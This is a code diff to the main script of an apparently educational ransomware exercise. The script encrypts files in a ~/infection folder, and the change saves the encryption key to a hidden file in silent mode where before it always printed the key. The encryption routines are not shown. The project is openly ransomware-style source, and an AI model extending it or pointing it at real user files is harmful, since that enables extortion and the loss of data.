@@ -7,10 +7,18 @@ This project is for educational purposes only.
 Do not use it with malicious intent.
 """
 
+import os
 import sys
 from args import get_args
 from infection import get_infection_dir, get_target_files, get_encrypted_files
 from crypto import generate_key, encrypt_file, decrypt_file
+
+KEY_FILE = os.path.join(os.path.expanduser("~"), "infection", ".stockholm_key")
+
+
+def save_key_to_file(key):
+    with open(KEY_FILE, 'w') as f:
+        f.write(key)
 
 
 def main():
@@ -44,9 +52,10 @@ def main():
 
         key = generate_key()
 
-        # Always print the key — even in silent mode.
-        # Without it the files cannot be decrypted, ever.
-        print(f"[!] Your encryption key (save this now):\n    {key}\n")
+        if args.silent:
+            save_key_to_file(key)
+        else:
+            print(f"[!] Your encryption key (save this now):\n    {key}\n")
 
         log(f"[~] Encryption mode — {len(files)} file(s) to encrypt.")
         for f in files:
